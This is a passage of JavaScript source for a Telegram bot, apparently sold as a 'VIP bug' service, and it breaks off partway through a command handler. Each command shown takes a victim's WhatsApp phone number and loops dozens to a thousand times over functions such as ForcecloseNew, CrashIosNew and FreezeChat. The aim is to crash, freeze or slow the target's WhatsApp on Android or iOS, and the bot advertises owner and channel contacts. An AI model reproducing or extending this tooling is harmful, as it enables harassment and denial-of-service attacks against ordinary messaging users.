        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-fccombo AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "Example:\n" +
                "<code>/lucky-fccombo 923xxxxxxx</code>\n\n" +
                "<i>Example:</i> <code>/lucky-efcenew 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>" + groupHint,
                { parse_mode: "HTML" }
            );
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 100; z++) {
                await tableButtonExploit(client, X);
                await ForcecloseNew(client, X);
                await new Promise(resolve => setImmediate(resolve)); 
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}
      
  case "lucky-fcbeta": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-fcbeta AGAIN..`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE:\n" +
                "<code>/lucky-fcbeta 923xxxxxxx</code>\n\n" +
                "<i>Example:</i> <code>/lucky-efcenew 923</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 100; z++) {
                await ForcecloseNew(client, X) ;
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}

case "lucky-king": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-fcbeta AGAIN..`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE:\n" +
                "<code>/lucky-king 923xxxxxxx</code>\n\n" +
                "<i>Example:</i> <code>/lucky-efcenew 923</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 1000; z++) {
                await DelayHardXDrainKoutaX7(client, X);
                
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}

case "lucky-iosking": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-fcbeta AGAIN..`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE:\n" +
                "<code>/lucky-iosking 923xxxxxxx</code>\n\n" +
                "<i>Example:</i> <code>/lucky-iosking 923</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash ios</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 40; z++) {
                await TrashLocIosX(client, X, ptcp = true);
                await TrashLocIosX(client, X, ptcp = true);
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}
      
      case "lucky-ui": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-ui AGAIN..`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERRORr</b>\n" +
                "Example:\n" +
                "<code>/lucky-ui 923xxxxxxx</code>\n\n" +
                "<i>EXAMPLE:</i> <code>/lucky-ui 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 500; z++) {
                await FreezeChat(client, X);
                await sleep(8000);
                await new Promise(resolve => setImmediate(resolve));
                await crashV5(client, X);
                await new Promise(resolve => setImmediate(resolve)); 
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi....");
    }
    break;
}
      case "lucky-godbye": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Jari Hai*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /lucky-godbye lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");

        const input = ctx.message.text.split(" ")[1];
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/lucky-godbye 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/lucky-godbye 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");

        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ WhatsApp number galat hai! (kam az kam 10 digits)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);

        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Pehle pair karein:\n" +
                "<code>/reqpair 923xxxx</code>" + groupHint,
                { parse_mode: "HTML" }
            );
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;

        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>delay andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });


        // ================================
        // 🔥 LOOP EKSEKUSI BUG
        // ================================
        (async () => {
            for (let i = 0; i < 1000; i++) {
                try {
                  await CrashByDell(client, X);
                    await sleep(15000);
                    console.log(chalk.green(`[✓] Execution loop ${i + 1} sukses`));
                } catch (err) {
                    console.log(chalk.red(`[✗] Execution failed (loop ${i + 1}) → ${err.message}`));
                }
            }
        })();

    } catch (err) {
        log.error(`BUG ERROR: ${err.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi.");
    }
    break;
}
      case "lucky-delaynew": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-delaynew AGAIN..`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE\n" +
                "<code>/lucky-delaynew 923xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/lucky-jam 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>delay andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       
       (async () => {
                for (let z = 0; z < 80; z++) {
                await sange(client, X);
                await sleep(1000);
                }
                })();

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}
      
      case "lucky-beta": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-beta AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE\n" +
                "<code>/lucky-beta 923xxxxxx</code>\n\n" +
                "<i>EXAMPLE:</i> <code>/lucky-beta 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>delay andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

        (async () => {
                for (let z = 0; z < 100; z++) {
                await Travels(client, X);
                }
                })();
       
     
        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi....");
    }
    break;
}
      
      case "lucky-ios": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-ios AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE:\n" +
                "<code>/lucky-ios 923xxxxxxx</code>\n\n" +
                "<i>Example</i> <code>/lucky-ios 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash iphone</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

               (async () => {
                for (let z = 0; z < 200; z++) {
                await LovelyStars(client, X);
    await CrashIosNew(client, X);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}
case "lucky-iosnew": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-iosnew AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE:\n" +
                "<code>/lucky-iosnew 923xxxxxxx</code>\n\n" +
                "<i>Example</i> <code>/lucky-iosnew 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash iphone</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

               (async () => {
                for (let z = 0; z < 100; z++) {
                await LovelyStars(client, X);
                await iosnew(client, X);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi...");
    }
    break;
}
      
      case "crashcall": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /crashcall AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE\n" +
                "<code>/crashcall 923xxxxxx</code>\n\n" +
                "<i>Example</i> <code>/crashcall 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>delay andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       
               (async () => {
                for (let z = 0; z < 100; z++) {
                await Occolot(client, X);
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi....");
    }
    break;
}
      case "lucky-pending": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-pending AGAIN.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>CMD ERROR</b>\n" +
                "EXAMPLE\n" +
                "<code>/lucky-pending 923xxxxxx</code>\n\n" +
                "<i>Example</i> <code>/crashcall 923xxx</code>",
                { parse_mode: "HTML" }
            );
        }

